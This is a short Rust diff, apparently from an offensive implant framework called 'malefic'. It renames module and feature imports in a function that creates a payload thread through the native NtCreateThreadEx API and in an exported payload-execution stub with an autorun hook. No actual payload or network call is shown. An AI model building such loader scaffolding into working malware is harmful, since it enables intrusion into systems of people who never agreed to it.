@@ -3,7 +3,7 @@ use std::{thread, ptr};
 /// Thread creation interface with feature-based overrides
 #[cfg(feature = "native_thread")]
 pub fn create_payload_thread() {
-    use malefic_helper::win::kit::apis::{m_nt_create_thread_ex, m_get_current_process};
+    use malefic_os_win::kit::apis::{m_nt_create_thread_ex, m_get_current_process};
 
     unsafe {
         let mut thread_handle: *mut core::ffi::c_void = ptr::null_mut();
@@ -51,7 +51,7 @@ pub fn create_payload_thread() {
 #[no_mangle]
 pub extern "C" fn execute_payload() {
     // TODO: Users add their payload implementation here
-    #[cfg(feature = "malefic-prelude")]
-    if let Err(_e) = malefic_prelude::run() {
+    #[cfg(feature = "malefic-autorun")]
+    if let Err(_e) = malefic_autorun::run() {
     }
 }
